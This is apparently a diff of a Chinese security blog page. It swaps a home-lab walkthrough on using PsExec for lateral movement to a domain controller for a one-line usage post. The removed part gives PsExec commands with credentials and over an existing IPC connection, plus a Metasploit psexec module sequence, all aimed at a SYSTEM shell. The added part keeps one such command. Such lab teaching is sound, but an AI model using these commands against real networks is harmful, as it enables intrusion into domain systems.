@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
-  <title>利用PsExec进行横向渗透 | Sriracha :)</title>
-  <meta name="keywords" content>
-  <meta name="description" content="利用PsExec进行横向渗透 | Sriracha :)">
+  <title>how-psexec-works | Sriracha :)</title>
+  <meta name="keywords" content=" 内网渗透 ">
+  <meta name="description" content="how-psexec-works | Sriracha :)">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta property="og:type" content="website">
 <meta property="og:title" content="Python">
@@ -1094,19 +1094,25 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-利用PsExec进行横向渗透" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-how-psexec-works" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">利用PsExec进行横向渗透</h1>
+        <h1 class="article-title">how-psexec-works</h1>
     
     <div class="article-meta">
         
         
         
+        
+        <span class="tag">
+            
+            <a class="color5">内网渗透</a>
+            
+        </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2020-02-04 19:30:38'>2020-02-04 17:44</time>
+        创建时间:<time class="date" title='更新时间: 2020-12-21 15:27:23'>2020-12-21 15:21</time>
         
     </div>
     <div class="article-meta">
@@ -1128,7 +1134,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#利用条件"><span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#模拟利用过程"><span class="toc-text">模拟利用过程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#定位域控"><span class="toc-text">定位域控</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#无IPC连接"><span class="toc-text">无IPC连接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#有IPC连接"><span class="toc-text">有IPC连接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Msf中的Psexec模块"><span class="toc-text">Msf中的Psexec模块</span></a></li></ol></li></ol>
+        
     
 <style>
     .left-col .switch-btn,
@@ -1144,30 +1150,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h1><ul>
-<li>需要目标机器开启了ADMIN$共享(默认开启)</li>
-<li>建立了IPC连接，可以不输入账号密码连接到CMD窗口</li>
-</ul>
-<p>下载地址:<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p>
-<p>优点：可直接获取SYSTEM权限的交互式shell<br>缺点：利用时会产生一个Psecex的服务，这个服务会产生日志文件，容易溯源</p>
-<h1 id="模拟利用过程"><a href="#模拟利用过程" class="headerlink" title="模拟利用过程"></a>模拟利用过程</h1><ul>
-<li>Win Server 2012 R2(DC)</li>
-<li>Win 7(域中的一台机器)</li>
-</ul>
-<h2 id="定位域控"><a href="#定位域控" class="headerlink" title="定位域控"></a>定位域控</h2><p>我们现在用Win7去攻击域控，在win7下cmd</p>
-<p>首先看看ip<br><img src="/2020/02/04/利用PsExec进行横向渗透/ipconfig.png" alt><br>没发现域控在那台机器，win7的ip是192.168.43.102<br><img src="/2020/02/04/利用PsExec进行横向渗透/domain.png" alt><br>查看域<br><img src="/2020/02/04/利用PsExec进行横向渗透/hacke.png" alt><br>查看域内其他主机<br><img src="/2020/02/04/利用PsExec进行横向渗透/nslookup.png" alt><br>利用nslookup定位DC</p>
-<p>这里我并未对DC做设置，所以默认的时候ADMIN$是共享状态，你也可以使用net share命令查看共享的资源</p>
-<h2 id="无IPC连接"><a href="#无IPC连接" class="headerlink" title="无IPC连接"></a>无IPC连接</h2><p>我们在win7的机器上查看了解情况，若无共享的连接，则我们在使用PsExec的时候需要使用账号密码进行验证<br><img src="/2020/02/04/利用PsExec进行横向渗透/use.png" alt></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe \\192.168.43.100 -u username -p password</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/02/04/利用PsExec进行横向渗透/none.png" alt><br>无需弹出新的cmd窗口，直接拿下域控</p>
-<h2 id="有IPC连接"><a href="#有IPC连接" class="headerlink" title="有IPC连接"></a>有IPC连接</h2><p><img src="/2020/02/04/利用PsExec进行横向渗透/yes.png" alt></p>
-<p>这个时候无需验证账号密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe \\192.168.43.100 cmd.exe</span><br></pre></td></tr></table></figure></p>
-<p><img src="/2020/02/04/利用PsExec进行横向渗透/2.png" alt><br>成功啦~</p>
-<h2 id="Msf中的Psexec模块"><a href="#Msf中的Psexec模块" class="headerlink" title="Msf中的Psexec模块"></a>Msf中的Psexec模块</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set RHOST 192.168.43.100</span><br><span class="line">set smbuser usernmae</span><br><span class="line">set smbpass password</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/02/04/利用PsExec进行横向渗透/msf.png" alt></p>
-<p>这样就利用成功了</p>
-<p>总的来说这个psexec利用的方式就是，只要服务器上面有连接的IPC，就可以搞出cmd。</p>
-<p>差不多就这样吧</p>
+        <p>PsExec用法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe \\192.168.1.1 -u administrator -p 123456 -s cmd</span><br></pre></td></tr></table></figure></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 sher10cksec@foxmail.com </span>
@@ -1177,12 +1160,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>利用PsExec进行横向渗透</p>
+    <p><span class="copy-title">文章标题:</span>how-psexec-works</p>
     
     <p><span class="copy-title">本文作者:</span><a  title="sher10ck">sher10ck</a></p>
-    <p><span class="copy-title">发布时间:</span>2020-02-04, 17:44:00</p>
-    <p><span class="copy-title">最后更新:</span>2020-02-04, 19:30:38</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/02/04/利用PsExec进行横向渗透/" title="利用PsExec进行横向渗透">http://sherlocz.github.io/2020/02/04/利用PsExec进行横向渗透/</a>
+    <p><span class="copy-title">发布时间:</span>2020-12-21, 15:21:18</p>
+    <p><span class="copy-title">最后更新:</span>2020-12-21, 15:27:23</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/12/21/how-psexec-works/" title="how-psexec-works">http://sherlocz.github.io/2020/12/21/how-psexec-works/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
